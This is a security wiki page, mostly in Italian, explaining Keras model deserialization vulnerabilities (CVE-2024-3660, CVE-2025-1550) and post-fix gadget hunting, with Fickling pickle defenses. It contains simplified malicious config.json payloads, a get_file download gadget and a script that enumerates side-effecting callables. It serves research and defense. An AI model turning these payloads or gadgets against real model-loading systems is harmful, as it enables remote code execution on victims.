# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Questa pagina riassume tecniche pratiche di exploitation contro la pipeline di deserializzazione dei modelli Keras, spiega gli internals del formato nativo .keras e la sua attack surface, e fornisce un toolkit per ricercatori per trovare Model File Vulnerabilities (MFVs) e post-fix gadgets.

## Interni del formato del modello .keras

Un file .keras è un archivio ZIP che contiene almeno:
- metadata.json – informazioni generiche (es., versione di Keras)
- config.json – architettura del modello (primary attack surface)
- model.weights.h5 – pesi in HDF5

Il config.json controlla la deserializzazione ricorsiva: Keras importa moduli, risolve classi/funzioni e ricostruisce layer/oggetti da dizionari controllati dall'attaccante.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Storicamente, questo esponeva tre primitive a un attaccante che costruiva config.json:
- Controllo di quali moduli vengono importati
- Controllo di quali classi/funzioni vengono risolte
- Controllo dei kwargs passati ai costruttori/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigazione:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.

Note:
- I formati legacy (vecchi salvataggi HDF5) o codebase più datate potrebbero non applicare i controlli moderni, quindi gli attacchi in stile “downgrade” possono ancora applicarsi quando le vittime usano loader più vecchi.

## CVE-2025-1550 – Import arbitrario di moduli in Keras ≤ 3.8

Causa principale:
- _retrieve_class_or_fn usava importlib.import_module() senza restrizioni con stringhe di modulo controllate dall'attaccante provenienti da config.json.
- Impatto: import arbitrario di qualsiasi modulo installato (o di un modulo piazzato dall'attaccante su sys.path). Il codice all'import viene eseguito, poi la costruzione dell'oggetto avviene con kwargs controllati dall'attaccante.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Miglioramenti della sicurezza (Keras ≥ 3.9):
- Allowlist dei moduli: import limitati ai moduli dell'ecosistema ufficiale: keras, keras_hub, keras_cv, keras_nlp
- Modalità sicura predefinita: safe_mode=True blocca il caricamento di funzioni serializzate Lambda non sicure
- Controllo di tipo di base: gli oggetti deserializzati devono corrispondere ai tipi attesi

## Superficie dei gadget post-fix nella allowlist

Anche con l'allowlisting e la safe mode, rimane una superficie ampia tra i callables di Keras consentiti. Per esempio, keras.utils.get_file può scaricare URL arbitrari in posizioni selezionabili dall'utente.

Gadget via Lambda che fa riferimento a una funzione consentita (non bytecode Python serializzato):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitazione importante:
- Lambda.call() antepone il tensor di input come primo argomento posizionale quando viene invocato il callable target. I gadget scelti devono tollerare un argomento posizionale extra (o accettare *args/**kwargs). Questo vincola quali funzioni sono utilizzabili.

Possibili impatti degli allowlisted gadgets:
- Download/scrittura arbitraria (path planting, config poisoning)
- Callback di rete / effetti simili a SSRF a seconda dell'ambiente
- Possibilità di esecuzione di codice se i percorsi scritti vengono poi importati/eseguiti o aggiunti a PYTHONPATH, o se esiste una location scrivibile che esegue al momento della scrittura (execution-on-write)

## Toolkit per i ricercatori

1) Scoperta sistematica dei gadget nei moduli consentiti

Enumerare i callable candidati in keras, keras_nlp, keras_cv, keras_hub e dare priorità a quelli con effetti collaterali su file/rete/processo/ambiente.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Test diretto di deserialization (nessun archivio .keras necessario)

Inserisci dicts appositamente creati direttamente nei deserializers di Keras per apprendere i params accettati e osservare gli effetti collaterali.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing and formats

Keras esiste in più codebase/ere con diversi meccanismi di sicurezza e formati:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, previsto per la rimozione)
- tf-keras: mantenuto separatamente
- Multi-backend Keras 3 (official): ha introdotto il formato nativo .keras

Ripetere i test attraverso codebase e formati (.keras vs legacy HDF5) per scoprire regressioni o protezioni mancanti.

## Defensive recommendations

- Trattare i file modello come input non attendibili. Caricare modelli solo da sorgenti trusted.
- Tenere Keras aggiornato; usare Keras ≥ 3.9 per beneficiare di allowlisting e controlli di tipo.
- Non impostare safe_mode=False quando si caricano modelli a meno che non si abbia completa fiducia nel file.
- Considerare di eseguire la deserializzazione in un ambiente sandboxed e least-privileged senza accesso di rete in uscita e con accesso al filesystem ristretto.
- Applicare allowlists/signatures per le sorgenti dei modelli e controlli di integrità quando possibile.

## ML pickle import allowlisting for AI/ML models (Fickling)

Molti formati di modelli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, vecchi artifact TensorFlow, ecc.) incorporano dati Python pickle. Gli aggressori abusano regolarmente degli import GLOBAL di pickle e dei costruttori di oggetti per ottenere RCE o sostituzione del modello durante il caricamento. I scanner basati su blacklist spesso non rilevano import pericolosi nuovi o non elencati.

Una difesa pratica fail-closed è agganciare il deserializer pickle di Python e consentire solo un set revisionato di import innocui correlati all’ML durante l’unpickling. Trail of Bits’ Fickling implementa questa policy e distribuisce una allowlist di import ML curata, costruita a partire da migliaia di pickles pubblici su Hugging Face.

Modello di sicurezza per import “sicuri” (intuizioni distillate da ricerca e pratica): i simboli importati usati da un pickle devono simultaneamente:
- Non eseguire codice o causare esecuzione (niente oggetti compiled/source code, esecuzione di comandi esterni, hook, ecc.)
- Non ottenere/impostare attributi o elementi arbitrari
- Non importare o ottenere riferimenti ad altri oggetti Python dalla VM del pickle
- Non innescare deserializer secondari (es. marshal, nested pickle), neanche indirettamente

Abilitare le protezioni di Fickling il prima possibile nell’avvio del processo in modo che eventuali caricamenti di pickle effettuati da framework (torch.load, joblib.load, ecc.) siano verificati:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Suggerimenti operativi:
- Puoi disabilitare/riabilitare temporaneamente gli hooks dove necessario:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se un modello noto come valido è bloccato, estendi la allowlist per il tuo ambiente dopo aver esaminato i simboli:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling espone anche dei guard di runtime generici se preferisci un controllo più granulare:
- fickling.always_check_safety() per applicare i controlli su tutti i pickle.load()
- with fickling.check_safety(): per enforcement limitato (scoped)
- fickling.load(path) / fickling.is_likely_safe(path) per controlli one-off

- Preferisci formati di modello non-pickle quando possibile (es., SafeTensors). Se devi accettare pickle, esegui i loader con least privilege, senza network egress e applica l'allowlist.

Questa strategia allowlist-first blocca dimostrabilmente i percorsi di exploit comuni dei pickle ML mantenendo un'elevata compatibilità. Nel benchmark di ToB, Fickling ha segnalato il 100% dei file dannosi sintetici e ha consentito ~99% dei file puliti provenienti dai principali repo di Hugging Face.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
